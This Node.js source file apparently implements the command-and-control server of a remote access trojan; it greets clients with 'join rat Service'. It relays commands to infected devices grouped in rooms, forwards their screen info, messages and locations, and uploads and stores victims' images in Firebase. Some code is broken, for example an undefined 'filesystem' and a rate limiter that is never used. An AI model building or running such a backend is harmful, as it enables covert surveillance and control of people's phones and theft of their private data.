var express = require('express')
var App = express()
var Bodyparser = require('body-parser')
var {rateLimit} = require("express-rate-limit")

const LimitRuls = rateLimit({
  windowMs: 3 * 60 * 1000, // 15 minutes
	max: 100, // Limit each IP to 100 requests per `window` (here, per 15 minutes)
	standardHeaders: true, // Return rate limit info in the `RateLimit-*` headers
	legacyHeaders: false, // Disable the `X-RateLimit-*` headers
})

App.use(Bodyparser.json())

App.use(Bodyparser.urlencoded({ extended: true,limit:"25MB" })); 
var path = require('path')
require("dotenv").config()




// Import the functions you need from the SDKs you need
var {initializeApp} =require('firebase/app')
const FirbaseDatabase = require('firebase/database');
const  FirebaseStorage = require('firebase/storage')



// TODO: Add SDKs for Firebase products that you want to use
// https://firebase.google.com/docs/web/setup#available-libraries
// Your web app's Firebase configuration
const firebaseConfig = {
  apiKey: process.env.API_KEY,
  authDomain: process.env.AUTH_DOMAIN,
  projectId: process.env.PROJECT_ID,
  storageBucket: process.env.STORAGE_BUCKET,
  messagingSenderId: process.env.MESSAGIND_SENDER_ID,
  appId: process.env.APP_ID
};

// Initialize Firebase
const firebaseapp = initializeApp(firebaseConfig);
const firebasestorage = FirebaseStorage.getStorage(firebaseapp)
const firebasedatabase = FirbaseDatabase.getDatabase(firebaseapp)

var PORT =  process.env.PORT ||3000 
var http = require('http').createServer(App)

var socket = require('socket.io')(http)

http.listen(PORT,()=>{
    console.log("Server is running... \n   port:"+PORT+"\nhttp://192.168.1.62:"+PORT)
    
})








var allrooms =[]



App.get("/",(req,res)=>{
    res.sendFile(path.join(__dirname,"views","controller.html"))
})

App.get("/info",(req,res)=>{
  res.sendFile(path.join(__dirname,"views","information.html"))
})
App.get("/image",(req,res)=>{
  res.sendFile(path.join(__dirname,"views","images.html"))
})

App.post("/id/:mod/:id",(req,res)=>{
  if(req.params.mod == "get"){
      
      res.send(allrooms).status(200)
  }
  else if(req.params.mod == "delet"){
      console.log(req.params.id)
      allrooms = allrooms.filter(value =>value != req.params.id.toString())
      res.send(allrooms).status(200)

  }else{
      res.send("in valid mode").status(404)
  }
})







App.post("/files",(req,res)=>{
AllFilePath().then((data)=>{
  res.send(data)
})
 
})


App.post("/image",(req,res)=>{
  if(req.body.image != null&&req.body.name != null){
    const buffer = Buffer.from(req.body.image, "base64");
    var StorageSize = TotalStorage()
 
    if(StorageSize < 1000000){
 
       // filesystem.writeFileSync(path.join(__dirname,"Bucket",req.body.name) , buffer);
        res.send("PHOTO SAVED size_left:"+((100000*0.001)-(TotalStorage()*0.001))+"mb")

        var storageref = FirebaseStorage.ref(firebasestorage,`/image/${req.body.name}`)
        var uploadtask = FirebaseStorage.uploadBytesResumable(storageref,buffer)
        uploadtask.on("state_changed",(snapshot)=>{

        },
        (err)=>{
          console.log(err)
        },()=>{
          FirebaseStorage.getDownloadURL(uploadtask.snapshot.ref).then((url)=>{
          
            
            FirbaseDatabase.push( FirbaseDatabase.ref(firebasedatabase,"image"),{"name":req.body.name,"url":url}).then(()=>{
              console.log("Suscess full")
            }).catch(()=>{
              console.log("error")
            })

          })
         
        })

    }else{
       res.send("Size full :1000 mb");
    }
  
  }else{
    res.send("For upload photo must Require {image:bae64 , name:myimage.jpg }  ");
  }
   
})









socket.on('connection',Socket=>{
  console.log("connected")

  Socket.emit("join_me","join rat Service")

  console.log(Socket.id)

  Socket.on('cmd',valu=>{
      console.log(valu)
      Socket.to(valu.room).emit('data',valu.data)
  })


//viewe\app-release.apk'
  Socket.on('join_room',(roomid)=>{
       if(roomid.length > 1){
        Socket.join(roomid)
        if(!allrooms.some(val=>val == roomid)){
           
          allrooms.push(roomid)
      }
       }else{}

   })


   Socket.on("screeninfo",(room,data)=>{
       
      Socket.to(room).emit("screeninfo", data);
   })

   Socket.on("msg",(room,data)=>{
     if(room != ""){
      Socket.to(room).emit("msg", data);
     }
     
     else{
       console.log("no room define")
     }
   })

   Socket.on("location",(room,data)=>{
     console.log(data)
       Socket.to(room).emit("location",data)
   })



  // socket.emit("new message","hi i am server")
  Socket.on('disconnect',()=>{
      console.log("user disconnet")
  })

})



function TotalStorage(){
          var TOTAL_KB = 0;
           
            filesystem.readdirSync(path.join(__dirname,"Bucket")).forEach((filename)=>{
              
                TOTAL_KB+= filesystem.statSync(path.join(__dirname,"Bucket",filename)).size
               
             })
             return TOTAL_KB *0.001

}

function AllFilePath(){
    
    return new Promise((resolve,reject)=>{
      const countref =  FirbaseDatabase.ref(firebasedatabase,"image")
      FirbaseDatabase.onValue(countref,(snapshot)=>{
       resolve(snapshot.val())
      })
    })


    }

    
    
